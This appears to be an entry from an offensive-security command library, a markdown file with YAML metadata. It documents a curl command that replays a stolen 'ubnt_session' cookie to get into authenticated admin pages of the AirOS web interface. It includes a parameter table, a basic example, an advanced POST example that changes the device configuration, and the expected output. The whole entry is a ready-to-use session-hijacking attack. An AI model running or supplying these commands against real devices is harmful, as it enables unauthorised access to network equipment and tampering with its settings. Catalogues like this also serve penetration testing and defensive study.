---
data: >-
  curl -H "Cookie: ubnt_session=STOLEN_SESSION_ID"
  "http://<device-ip>/admin.html"
tags:
  - session
  - hijack
  - replay
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.645Z'
id: 47f49924-a53a-44ad-bc0f-61c20839b8fc
verified: false
validated: true
submitted: true
---
# curl-session-replay

## Command

```bash
curl -H "Cookie: ubnt_session=STOLEN_SESSION_ID" "http://<device-ip>/admin.html"
```

## Description

Replays a stolen session cookie to access authenticated areas of the AirOS web interface.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds custom header for cookie | Yes |
| `ubnt_session` | AirOS session cookie name | Yes |
| `STOLEN_SESSION_ID` | Captured value | Yes |
| `<device-ip>` | Target IP | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: ubnt_session=abc123" "http://192.168.1.1/status.html"
```

### Advanced Usage

```bash
curl -H "Cookie: ubnt_session=abc123" -X POST -d "action=change_config" "http://192.168.1.1/admin.html"
```

## Expected Output

Authenticated page content, such as admin dashboard HTML, without login prompt.

## Related

- [[Related Procedure]]
